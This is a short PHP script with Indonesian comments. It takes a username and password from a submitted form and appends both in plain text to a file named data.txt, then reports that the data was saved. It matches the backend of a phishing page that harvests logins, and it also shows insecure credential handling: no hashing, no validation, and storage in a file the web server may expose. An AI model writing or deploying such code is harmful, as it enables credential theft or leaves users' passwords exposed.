<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    
    // Simpan data ke file "data.txt"
    $file = fopen("data.txt", "a");
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    echo "Data berhasil disimpan!";
}
?>
